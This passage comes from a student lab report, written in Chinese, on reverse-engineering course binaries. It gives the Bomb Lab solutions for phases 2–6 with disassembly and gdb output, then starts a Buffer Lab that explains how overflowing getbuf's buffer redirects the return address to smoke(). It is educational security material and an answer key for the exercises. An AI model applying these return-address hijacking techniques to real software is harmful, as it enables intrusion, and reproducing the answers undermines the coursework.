class="line"> 8048bcc:	8b 45 fc             	mov    -0x4(%ebp),%eax # a=i</span><br><span class="line"> 8048bcf:	48                   	dec    %eax # a=i-1</span><br><span class="line"> 8048bd0:	8b 44 85 e4          	mov    -0x1c(%ebp,%eax,4),%eax # a=M[base+4*(i-1)-4*7] A[i-8]</span><br><span class="line"> 8048bd4:	83 c0 05             	add    $0x5,%eax #a=a+5</span><br><span class="line"> 8048bd7:	39 c2                	cmp    %eax,%edx #cmp A[i-7]:(A[i-8]+5)</span><br><span class="line"> 8048bd9:	74 05                	je     8048be0 &lt;phase_2+0x3c&gt; #if = goto 8048be0</span><br><span class="line"> 8048bdb:	e8 e6 0a 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048be0:	ff 45 fc             	incl   -0x4(%ebp) </span><br><span class="line"> 8048be3:	83 7d fc 05          	cmpl   $0x5,-0x4(%ebp) # comp i:5</span><br><span class="line"> 8048be7:	7e dc                	jle    8048bc5 &lt;phase_2+0x21&gt; # if &lt;= goto 8048bc5</span><br><span class="line"> 8048be9:	c9                   	leave  </span><br><span class="line"> 8048bea:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>有一个<code>read_six_numbers</code>的函数，猜测会从输入中读取六个数字。阅读中间的反汇编代码，判断是比较相邻输入的差是否为
5。所以只要满足+5 的等差数列就是符合条件的正确答案。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">5 10 15 20 25 30</span><br></pre></td></tr></table></figure>
<h3 id="phase-3">Phase 3</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048beb &lt;phase_3&gt;:</span><br><span class="line"> 8048beb:	55                   	push   %ebp</span><br><span class="line"> 8048bec:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048bee:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8048bf1:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)</span><br><span class="line"> 8048bf8:	8d 45 f0             	lea    -0x10(%ebp),%eax</span><br><span class="line"> 8048bfb:	89 44 24 10          	mov    %eax,0x10(%esp)</span><br><span class="line"> 8048bff:	8d 45 ef             	lea    -0x11(%ebp),%eax</span><br><span class="line"> 8048c02:	89 44 24 0c          	mov    %eax,0xc(%esp)</span><br><span class="line"> 8048c06:	8d 45 f4             	lea    -0xc(%ebp),%eax</span><br><span class="line"> 8048c09:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048c0d:	c7 44 24 04 dc 99 04 	movl   $0x80499dc,0x4(%esp)</span><br><span class="line"> 8048c14:	08 </span><br><span class="line"> 8048c15:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048c18:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048c1b:	e8 48 fc ff ff       	call   8048868 &lt;sscanf@plt&gt;</span><br><span class="line"> 8048c20:	89 45 f8             	mov    %eax,-0x8(%ebp)			# 返回参数值</span><br><span class="line"> 8048c23:	83 7d f8 02          	cmpl   $0x2,-0x8(%ebp) 			# cmp x:2</span><br><span class="line"> 8048c27:	7f 05                	jg     8048c2e &lt;phase_3+0x43&gt; 	# 参数大必须大于2</span><br><span class="line"> 8048c29:	e8 98 0a 00 00       	call   80496c6 &lt;explode_bomb&gt; </span><br><span class="line"> 8048c2e:	8b 45 f4             	mov    -0xc(%ebp),%eax </span><br><span class="line"> 8048c31:	89 45 dc             	mov    %eax,-0x24(%ebp)</span><br><span class="line"> 8048c34:	83 7d dc 07          	cmpl   $0x7,-0x24(%ebp) # 第一个参数必须小于7</span><br><span class="line"> 8048c38:	0f 87 c2 00 00 00    	ja     8048d00 &lt;phase_3+0x115&gt;</span><br><span class="line"> 8048c3e:	8b 55 dc             	mov    -0x24(%ebp),%edx</span><br><span class="line"> 8048c41:	8b 04 95 e8 99 04 08 	mov    0x80499e8(,%edx,4),%eax # 根据第一个参数计算跳转地址</span><br><span class="line"> 8048c48:	ff e0                	jmp    *%eax</span><br><span class="line"> 8048c4a:	c6 45 ff 74          	movb   $0x74,-0x1(%ebp) # 参数1为0跳转到这里，这里的0x74作为第2个参数对比</span><br><span class="line"> 8048c4e:	8b 45 f0             	mov    -0x10(%ebp),%eax</span><br><span class="line"> 8048c51:	3d 66 03 00 00       	cmp    $0x366,%eax  	# 第三个参数与0x366比较</span><br><span class="line"> 8048c56:	0f 84 ad 00 00 00    	je     8048d09 &lt;phase_3+0x11e&gt;</span><br><span class="line"> 8048c5c:	e8 65 0a 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048c61:	e9 a3 00 00 00       	jmp    8048d09 &lt;phase_3+0x11e&gt;</span><br><span class="line"> .......</span><br><span class="line"> 8048d09:	0f b6 45 ef          	movzbl -0x11(%ebp),%eax # 第2个参数与0x74比较，即116</span><br><span class="line"> 8048d0d:	38 45 ff             	cmp    %al,-0x1(%ebp)</span><br><span class="line"> 8048d10:	74 05                	je     8048d17 &lt;phase_3+0x12c&gt;</span><br><span class="line"> 8048d12:	e8 af 09 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048d17:	c9                   	leave  </span><br><span class="line"> 8048d18:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>第16行调用了sscanf函数输入，sscanf函数的声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sscanf</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *format, ...)</span>;</span><br><span class="line"><span class="comment">//str:数据源</span></span><br><span class="line"><span class="comment">//format:格式化字符串</span></span><br><span class="line"><span class="comment">//sscanf从字符串读取格式化输入，如果成功，该函数返回成功匹配和赋值的个数。    </span></span><br></pre></td></tr></table></figure>
<p>由此猜测第12行的<code>0x80499dc</code>应该是格式化字符串，作为参数传递给sscanf函数，打印该地址的字符串内容：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x80499dc</span><br><span class="line">0x80499dc:      &quot;%d %c %d&quot;</span><br></pre></td></tr></table></figure>
<p>可以看到要求输入3个参数，且格式为<code>"%d %c %d"</code>。再阅读后面的反汇编代码，可以知道第一个参数必须小于7，且程序依据第一个参数计算跳转地址，为方便起见，直接设置第一个参数为0，直接跳转到第一个判断条件；第一个判断条件比较参数3是否为<code>0x366</code>，即870；同时这里还将<code>0x74</code>保存到了栈<code>-0x1(%ebp)</code>中，是为了与参数2比较。因为参数2为char类型，使用ascii字符，116表示的字符为<code>t</code>；所以最后输入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 t 870</span><br></pre></td></tr></table></figure>
<h3 id="phase-4">Phase 4</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048d48 &lt;phase_4&gt;:</span><br><span class="line"> 8048d48:	55                   	push   %ebp</span><br><span class="line"> 8048d49:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d4b:	83 ec 28             	sub    $0x28,%esp</span><br><span class="line"> 8048d4e:	8d 45 f4             	lea    -0xc(%ebp),%eax</span><br><span class="line"> 8048d51:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048d55:	c7 44 24 04 08 9a 04 	movl   $0x8049a08,0x4(%esp)</span><br><span class="line"> 8048d5c:	08 </span><br><span class="line"> 8048d5d:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048d60:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048d63:	e8 00 fb ff ff       	call   8048868 &lt;sscanf@plt&gt;</span><br><span class="line"> 8048d68:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 8048d6b:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)</span><br><span class="line"> 8048d6f:	75 07                	jne    8048d78 &lt;phase_4+0x30&gt;</span><br><span class="line"> 8048d71:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048d74:	85 c0                	test   %eax,%eax</span><br><span class="line"> 8048d76:	7f 05                	jg     8048d7d &lt;phase_4+0x35&gt;</span><br><span class="line"> 8048d78:	e8 49 09 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048d7d:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 8048d80:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048d83:	e8 91 ff ff ff       	call   8048d19 &lt;func4&gt;</span><br><span class="line"> 8048d88:	89 45 f8             	mov    %eax,-0x8(%ebp)</span><br><span class="line"> 8048d8b:	81 7d f8 00 5f 37 00 	cmpl   $0x375f00,-0x8(%ebp) </span><br><span class="line"> 8048d92:	74 05                	je     8048d99 &lt;phase_4+0x51&gt;</span><br><span class="line"> 8048d94:	e8 2d 09 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048d99:	c9                   	leave  </span><br><span class="line"> 8048d9a:	c3                   	ret   </span><br></pre></td></tr></table></figure>
<p>与上一题相同，这里页使用了sscanf函数，找到格式字符串地址<code>0x8049a08</code>：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x8049a08</span><br><span class="line">0x8049a08:      &quot;%d&quot;</span><br></pre></td></tr></table></figure>
<p>在判断了匹配参数是否大于1之后，程序在第21行调用了函数func4对输入进行计算，并将返回值与<code>0x375f00</code>比较，如果相等则返回。func4反汇编代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048d19 &lt;func4&gt;:</span><br><span class="line"> 8048d19:	55                   	push   %ebp</span><br><span class="line"> 8048d1a:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d1c:	83 ec 08             	sub    $0x8,%esp</span><br><span class="line"> 8048d1f:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp) 	# 比较参数x是否大于1</span><br><span class="line"> 8048d23:	7f 09                	jg     8048d2e &lt;func4+0x15&gt; </span><br><span class="line"> 8048d25:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp) 	# return 1</span><br><span class="line"> 8048d2c:	eb 15                	jmp    8048d43 &lt;func4+0x2a&gt;</span><br><span class="line"> 8048d2e:	8b 45 08             	mov    0x8(%ebp),%eax 	# Get x</span><br><span class="line"> 8048d31:	48                   	dec    %eax 			# x=x-1;</span><br><span class="line"> 8048d32:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048d35:	e8 df ff ff ff       	call   8048d19 &lt;func4&gt; 	# 递归调用func4(x-1)</span><br><span class="line"> 8048d3a:	89 c2                	mov    %eax,%edx 	   	# d=func4(x-1)</span><br><span class="line"> 8048d3c:	0f af 55 08          	imul   0x8(%ebp),%edx 	# d=d*x</span><br><span class="line"> 8048d40:	89 55 fc             	mov    %edx,-0x4(%ebp)</span><br><span class="line"> 8048d43:	8b 45 fc             	mov    -0x4(%ebp),%eax 	# return x*func4(x-1)</span><br><span class="line"> 8048d46:	c9                   	leave  </span><br><span class="line"> 8048d47:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>通过分析func4的反汇编代码可知，该函数为一个递归函数，计算x!</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">func4</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(x&lt;=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> x*func4(x<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为<code>10!=3628800</code>，即<code>0x375f00</code>，所以答案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure>
<h3 id="phase-5">Phase 5</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048d9b &lt;phase_5&gt;:</span><br><span class="line"> 8048d9b:	55                   	push   %ebp</span><br><span class="line"> 8048d9c:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048d9e:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> 8048da1:	8d 45 e8             	lea    -0x18(%ebp),%eax  	# y in M[-0x18(%ebp)]</span><br><span class="line"> 8048da4:	89 44 24 0c          	mov    %eax,0xc(%esp)</span><br><span class="line"> 8048da8:	8d 45 ec             	lea    -0x14(%ebp),%eax 	# x in M[-0x14(%ebp)]</span><br><span class="line"> 8048dab:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048daf:	c7 44 24 04 0b 9a 04 	movl   $0x8049a0b,0x4(%esp) # format string</span><br><span class="line"> 8048db6:	08 </span><br><span class="line"> 8048db7:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048dba:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048dbd:	e8 a6 fa ff ff       	call   8048868 &lt;sscanf@plt&gt;</span><br><span class="line"> 8048dc2:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 8048dc5:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp) 		# 检查输入个数</span><br><span class="line"> 8048dc9:	7f 05                	jg     8048dd0 &lt;phase_5+0x35&gt;</span><br><span class="line"> 8048dcb:	e8 f6 08 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048dd0:	8b 45 ec             	mov    -0x14(%ebp),%eax </span><br><span class="line"> 8048dd3:	83 e0 0f             	and    $0xf,%eax </span><br><span class="line"> 8048dd6:	89 45 ec             	mov    %eax,-0x14(%ebp) 	# x=x&amp;0xf</span><br><span class="line"> 8048dd9:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048ddc:	89 45 f8             	mov    %eax,-0x8(%ebp)</span><br><span class="line"> 8048ddf:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp) 	# i=0</span><br><span class="line"> 8048de6:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp) 		# sum=0</span><br><span class="line"> 8048ded:	eb 16                	jmp    8048e05 &lt;phase_5+0x6a&gt;</span><br><span class="line"> 8048def:	ff 45 f0             	incl   -0x10(%ebp) 			# i++;</span><br><span class="line"> 8048df2:	8b 45 ec             	mov    -0x14(%ebp),%eax </span><br><span class="line"> 8048df5:	8b 04 85 c0 a5 04 08 	mov    0x804a5c0(,%eax,4),%eax </span><br><span class="line"> 8048dfc:	89 45 ec             	mov    %eax,-0x14(%ebp) 	# x=array[x]</span><br><span class="line"> 8048dff:	8b 45 ec             	mov    -0x14(%ebp),%eax</span><br><span class="line"> 8048e02:	01 45 f4             	add    %eax,-0xc(%ebp) 		# sum+=x</span><br><span class="line"> 8048e05:	8b 45 ec             	mov    -0x14(%ebp),%eax </span><br><span class="line"> 8048e08:	83 f8 0f             	cmp    $0xf,%eax 			# cmp x:15</span><br><span class="line"> 8048e0b:	75 e2                	jne    8048def &lt;phase_5+0x54&gt; </span><br><span class="line"> 8048e0d:	83 7d f0 0c          	cmpl   $0xc,-0x10(%ebp) 	# cmp i:12</span><br><span class="line"> 8048e11:	75 08                	jne    8048e1b &lt;phase_5+0x80&gt; </span><br><span class="line"> 8048e13:	8b 45 e8             	mov    -0x18(%ebp),%eax </span><br><span class="line"> 8048e16:	39 45 f4             	cmp    %eax,-0xc(%ebp) 		# cmp sum:y</span><br><span class="line"> 8048e19:	74 05                	je     8048e20 &lt;phase_5+0x85&gt; </span><br><span class="line"> 8048e1b:	e8 a6 08 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048e20:	c9                   	leave  </span><br><span class="line"> 8048e21:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>查看输入格式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x8049a0b</span><br><span class="line">0x8049a0b:      &quot;%d %d&quot;</span><br></pre></td></tr></table></figure>
<p>通过分析汇编代码可以知道，程序在第28行调用了数组，数组地址为<code>0x804a5c0</code>，且长度为16，因为要x的范围为<code>0&lt;=x&lt;16</code>，x要作为数组索引访问数组；这里最关键的就是打印出数组的值：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">(gdb) p *0x804a5c0@16</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5&#125;</span></span><br></pre></td></tr></table></figure>
<p>根据汇编代码反推出phase_5函数的源程序如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">phase_5</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> x,y;</span><br><span class="line">    <span class="type">int</span> n = ssccanf(str,<span class="string">&quot;%d %d&quot;</span>,&amp;x,&amp;y);</span><br><span class="line">    <span class="keyword">if</span>(n&lt;=<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        explode_bomb();</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="built_in">array</span>[] = &#123;<span class="number">10</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    x=x&amp;<span class="number">0xf</span>;</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">0xf</span>)&#123;</span><br><span class="line">        i++;</span><br><span class="line">        x=<span class="built_in">array</span>[<span class="number">4</span>*x];</span><br><span class="line">        sum+=x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="number">12</span>&amp;sum==y)</span><br><span class="line">    	<span class="keyword">return</span> ;</span><br><span class="line">    explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为循环只能进行12次，可以根据数组反推出x变化序列，进而得到序列和：<code>y=sum=93</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">15</span> <span class="number">6</span> <span class="number">14</span> <span class="number">2</span> <span class="number">1</span> <span class="number">10</span> <span class="number">0</span> <span class="number">8</span> <span class="number">4</span> <span class="number">9</span> <span class="number">13</span> <span class="number">11</span> <span class="number">7</span></span><br></pre></td></tr></table></figure>
<p>答案为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">7 93</span><br></pre></td></tr></table></figure>
<h3 id="phase-6">Phase 6</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048eb6 &lt;phase_6&gt;:</span><br><span class="line"> 8048eb6:	55                   	push   %ebp</span><br><span class="line"> 8048eb7:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048eb9:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048ebc:	c7 45 f8 6c a6 04 08 	movl   $0x804a66c,-0x8(%ebp) # 0x804a66c in M[-0x8(%ebp)]</span><br><span class="line"> 8048ec3:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048ec6:	89 04 24             	mov    %eax,(%esp)			# input_strings:str</span><br><span class="line"> 8048ec9:	e8 8a f9 ff ff       	call   8048858 &lt;atoi@plt&gt; 	# ascii to int</span><br><span class="line"> 8048ece:	89 c2                	mov    %eax,%edx 			# n1 = atoi(str)</span><br><span class="line"> 8048ed0:	8b 45 f8             	mov    -0x8(%ebp),%eax </span><br><span class="line"> 8048ed3:	89 10                	mov    %edx,(%eax) 			# n1 in 0x804a66c</span><br><span class="line"> 8048ed5:	8b 45 f8             	mov    -0x8(%ebp),%eax </span><br><span class="line"> 8048ed8:	89 04 24             	mov    %eax,(%esp) 			</span><br><span class="line"> 8048edb:	e8 42 ff ff ff       	call   8048e22 &lt;fun6&gt;</span><br><span class="line"> 8048ee0:	89 45 f8             	mov    %eax,-0x8(%ebp) 		# p=fun6(h)</span><br><span class="line"> 8048ee3:	8b 45 f8             	mov    -0x8(%ebp),%eax</span><br><span class="line"> 8048ee6:	89 45 fc             	mov    %eax,-0x4(%ebp) 		# p in M[-0x4(%ebp)]</span><br><span class="line"> 8048ee9:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp) 		# i=1</span><br><span class="line"> 8048ef0:	eb 0c                	jmp    8048efe &lt;phase_6+0x48&gt;</span><br><span class="line"> 8048ef2:	8b 45 fc             	mov    -0x4(%ebp),%eax 		</span><br><span class="line"> 8048ef5:	8b 40 08             	mov    0x8(%eax),%eax 		</span><br><span class="line"> 8048ef8:	89 45 fc             	mov    %eax,-0x4(%ebp) 		# p=p-&gt;next</span><br><span class="line"> 8048efb:	ff 45 f4             	incl   -0xc(%ebp) 			# i++;</span><br><span class="line"> 8048efe:	83 7d f4 08          	cmpl   $0x8,-0xc(%ebp) 		# cmp i:8</span><br><span class="line"> 8048f02:	7e ee                	jle    8048ef2 &lt;phase_6+0x3c&gt; </span><br><span class="line"> 8048f04:	8b 45 fc             	mov    -0x4(%ebp),%eax </span><br><span class="line"> 8048f07:	8b 10                	mov    (%eax),%edx			# get n2=p-&gt;val</span><br><span class="line"> 8048f09:	a1 6c a6 04 08       	mov    0x804a66c,%eax 		# get n1</span><br><span class="line"> 8048f0e:	39 c2                	cmp    %eax,%edx 			# cmp n2:n1</span><br><span class="line"> 8048f10:	74 05                	je     8048f17 &lt;phase_6+0x61&gt;</span><br><span class="line"> 8048f12:	e8 af 07 00 00       	call   80496c6 &lt;explode_bomb&gt;</span><br><span class="line"> 8048f17:	c9                   	leave  </span><br><span class="line"> 8048f18:	c3                   	ret    </span><br></pre></td></tr></table></figure>
<p>phase_6一开始调用了函数atoi，该函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">atoi</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br><span class="line"><span class="comment">// str -- 要转换为整数的字符串。</span></span><br><span class="line"><span class="comment">// 该函数返回转换后的长整数，如果没有执行有效的转换，则返回零。</span></span><br></pre></td></tr></table></figure>
<p>所以猜测需要输入一个可以转换为整数的字符串。运行程序并输入测试字符串<code>"12345"</code>，查看调用atoi函数前栈中的数据，可以看到输入字符串的地址被存放在栈顶，字符串起始地址为<code>0x804aa30</code>。在调用了atoi函数后，程序将返回值存放到了地址<code>0x804a66c</code>中，打印出来显示是刚刚输入的字符串转成的数字：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(gdb) x/s <span class="number">0</span>x804aa30</span><br><span class="line"><span class="number">0</span>x804aa30 &lt;input_strings+<span class="number">400</span>&gt;:  <span class="string">&quot;12&quot;</span></span><br><span class="line">...</span><br><span class="line">(gdb) x/d <span class="number">0</span>x804a66c</span><br><span class="line"><span class="number">0</span>x804a66c &lt;node0&gt;:      <span class="number">12</span></span><br></pre></td></tr></table></figure>
<p>接下来程序调用了函数fun6，并将返回值放入到<code>-0x4(%ebp)</code>中；其中第18到24行为链表的访问，执行8次后跳出循环。最后终止时比较与
atoi
转换的结果是否一致。通过阅读fun6的反汇编代码可知fun6函数并没有使用到atoi
转换的结果，所以直接运行到第27行查看寄存器<code>%edx</code>的值，该值为fun6得到的结果：149。最终答案为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">149</span></span><br></pre></td></tr></table></figure>
<h2 id="实验结果-1">实验结果</h2>
<p>phase1~6的答案如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">The <span class="built_in">future</span> will be better tomorrow.</span><br><span class="line"><span class="number">5</span> <span class="number">10</span> <span class="number">15</span> <span class="number">20</span> <span class="number">25</span> <span class="number">30</span></span><br><span class="line"><span class="number">0</span> t <span class="number">870</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">7</span> <span class="number">93</span></span><br><span class="line"><span class="number">149</span></span><br></pre></td></tr></table></figure>
<p>按照阶段依次输入上面分析的答案，运行结果截图如下：</p>
<p><img src="/post/ba783922/image-20221029143516251.png" alt="image-20221029143516251" style="zoom:67%;"></p>
<h1 id="实验3缓冲区溢出buffer-lab">实验3：缓冲区溢出（Buffer Lab）</h1>
<h2 id="实验目标">实验目标</h2>
<ul>
<li><p>掌握函数调用时的栈帧结构</p></li>
<li><p>利用输入缓冲区的溢出漏洞，将攻击代码嵌入当前程序的栈帧中，使得程序执行我们所期望的过程</p></li>
</ul>
<h2 id="实验介绍-2">实验介绍</h2>
<ul>
<li>文件组成
<ul>
<li>makecookie：生成cookie 例：./makecookie SA18225155 生成cookie</li>
<li>Bufbomb：可执行程序-攻击对象</li>
<li>Sendstring: 字符格式转换</li>
</ul></li>
<li>bufbomb程序</li>
</ul>
<p>Bufbomb中包含一个getbuf函数，该函数实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getbuf</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">12</span>]; <span class="comment">// 对buf没有越界检查,超过11个字符将溢出</span></span><br><span class="line">    Gets(buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>getbuf的反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">08048fe0 &lt;getbuf&gt;:</span><br><span class="line"> 8048fe0:	55                   	push   %ebp				#压入返回地址</span><br><span class="line"> 8048fe1:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048fe3:	83 ec 18             	sub    $0x18,%esp		#allocate 24B</span><br><span class="line"> 8048fe6:	8d 45 f4             	lea    -0xc(%ebp),%eax	#get string address</span><br><span class="line"> 8048fe9:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8048fec:	e8 6f fe ff ff       	call   8048e60 &lt;Gets&gt;</span><br><span class="line"> 8048ff1:	b8 01 00 00 00       	mov    $0x1,%eax		#return 1;</span><br><span class="line"> 8048ff6:	c9                   	leave  </span><br><span class="line"> 8048ff7:	c3                   	ret    </span><br><span class="line"> 8048ff8:	90                   	nop</span><br><span class="line"> 8048ff9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi</span><br></pre></td></tr></table></figure>
<ul>
<li>溢出</li>
</ul>
<p>溢出的字符将覆盖栈帧上的数据，特别的，会覆盖程序调用的返回地址，赋予我们控制程序流程的能力；通过构造溢出字符串，程序将“返回”至我们想要的代码上。</p>
<ul>
<li>字符构造</li>
</ul>
<p>计算机系统中，字符以ASCII码表示
/存储，例如，输入’1’，存储为’0x31’。本实验也需要扩展的ASCII码（128~255）。为了构造所需要的地址或其他数据，我们需要逆反”字符-&gt;ASCII码”的过程；采用代码包给出的
sendstring工具。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">./sendstring &lt; exploit.txt &gt; exploit<span class="literal">-raw</span>.txt</span><br></pre></td></tr></table></figure>
<p>其中exploit.txt保存目标数据（即空格分隔的ASCII码），exploit-raw.txt为逆向出的字符串。</p>
<ul>
<li>字符串输入</li>
</ul>
<p>前述方法构造出的字符串按如下方式输入：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">./bufbomb <span class="literal">-t</span> SA18225155 &lt; exploit<span class="literal">-raw</span>.txt</span><br></pre></td></tr></table></figure>
<p>从标准输入设备输入：ALT+ASC码的十进制数（小键盘输入）。注意，最后一个数字按下后与ALT键同时放开。例，输入字符“1”为ALT+49。实验完成后提交exploit.txt文件。</p>
<ul>
<li>指令构造方法示例</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pushl $0x89abcdef 	# Push value onto stack </span><br><span class="line">addl $17,%eax 		# Add 17 to %eax </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>保存成example.s，然后输入命令：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -c example.s </span><br><span class="line">objdump -d example.o &gt; example.d</span><br></pre></td></tr></table></figure>
<h2 id="实验过程">实验过程</h2>
<h3 id="level-0-candle">Level 0: Candle</h3>
<blockquote>
<p>目标：Bufbomb中一个正常情况下不会被执行的函数smoke，在getbuf返回时跳到smoke函数执行。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">smoke</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    entry_check(<span class="number">0</span>); <span class="comment">/* Make sure entered this function properly */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Smoke!: You called smoke()\n&quot;</span>);</span><br><span class="line">    validate(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要将smoke函数的地址放入getbuf的返回地址，需要构造合适的输入字符串。通过阅读getbuf的汇编代码可以知道输入字符串首地址被存放在内存栈<code>-0xc(%ebp)</code>中，运行程序，输入测试字符串，并打印出该字符串作验证。</p>
